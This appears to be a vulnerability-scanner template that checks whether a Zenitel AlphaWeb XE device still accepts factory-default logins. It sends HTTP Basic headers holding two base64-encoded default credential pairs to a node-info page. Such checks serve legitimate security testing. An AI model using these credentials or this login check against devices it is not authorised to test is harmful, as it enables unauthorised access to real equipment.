name: poc-yaml-alphaweb-xe-default-password
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /php/node_info.php
        expression: response.status == 401 && response.body.bcontains(b"You must provide the proper credentials!")
    r1:
        request:
            cache: true
            method: GET
            path: /php/node_info.php
            headers:
                Authorization: Basic YWRtaW46YWxwaGFhZG1pbg==
        expression: response.status == 200 && response.body.bcontains(b"HW Configuration") && response.body.bcontains(b"SW Configuration")
    r2:
        request:
            cache: true
            method: GET
            path: /php/node_info.php
            headers:
                Authorization: Basic YWxwaGE6Y29t
        expression: response.status == 200 && response.body.bcontains(b"HW Configuration") && response.body.bcontains(b"SW Configuration")
expression: r0() && r1() || r0() && r2()
detail:
    author: wulalalaaa(https://github.com/wulalalaaa)
    links:
        - https://wiki.zenitel.com/wiki/AlphaWeb#AlphaWeb_Login
